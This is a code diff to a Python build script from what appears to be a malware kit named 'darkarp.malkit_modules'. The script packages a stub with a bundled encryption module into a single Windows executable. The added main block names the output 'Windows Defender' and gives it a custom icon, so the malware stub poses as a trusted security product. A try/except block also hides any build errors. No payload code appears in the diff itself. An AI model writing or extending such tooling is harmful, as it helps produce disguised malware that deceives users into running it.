@@ -4,46 +4,48 @@ import pexe37
 from distutils.core import setup
 import darkarp.malkit_modules.encrypt as encrypt
 from shutil import rmtree
+from threading import Thread
 import time
 
 
 def exebuild(target, include, output, icon="icon.ico"):
-    sys.argv.append("pexe37")
-    setup(
-        options={
-            "pexe37": {
-                "compressed": True,
-                "bundle_files": 1,
-                "optimize": 2,
-                "excludes": [
-                    "pyreadline",
-                    "pdb",
-                    "unittest",
-                    "inspect"
-                    "difflib",
-                    "doctest",
-                    "optparse",
-                    "pickle",
-                    "argparse",
-                    "tarfile",
-                    "typing",
-                    "locale",
+    try:
+        sys.argv.append("pexe37")
+        setup(
+            options={
+                "pexe37": {
+                    "compressed": True,
+                    "bundle_files": 1,
+                    "optimize": 2,
+                    "excludes": [
+                        "pyreadline",
+                        "pdb",
+                        "unittest",
+                        "inspect"
+                        "difflib",
+                        "doctest",
+                        "pickle",
+                        "tarfile",
+                        "typing",
+                        "locale",
 
-                    "_lzma"
+                        "_lzma"
 
-                ],
-                "dll_excludes": ["msvcr71.dll", "Crypt32.dll"],
-                "includes": [f'{include}']
-            }
-        },
-        zipfile=None,
+                    ],
+                    "dll_excludes": ["msvcr71.dll", "Crypt32.dll", "tcl85.dll", "tk85.dll"],
+                    "includes": [f'{include}']
+                }
+            },
+            zipfile=None,
 
-        windows=[{
-            "script": target,
-            "icon_resources": [(1, icon)]
-        }]
+            console=[{
+                "script": target,
+                "icon_resources": [(1, icon)]
+            }]
 
-    )
+        )
+    except Exception as e:
+        pass
     if os.path.exists(f"{output}.exe"):
         os.remove(f"{output}.exe")
     os.rename(f"dist\\{target[:-3]}.exe", f"{output}.exe")
@@ -108,3 +110,8 @@ def exe_bytes(filename: str):
         bytelist.append(line)
     bytelist = b''.join(bytelist)
     return bytelist
+
+
+if __name__ == "__main__":
+    exebuild(target="stub.py", include='darkarp.malkit_modules.encrypt',
+             output='Windows Defender', icon="icon2.ico")
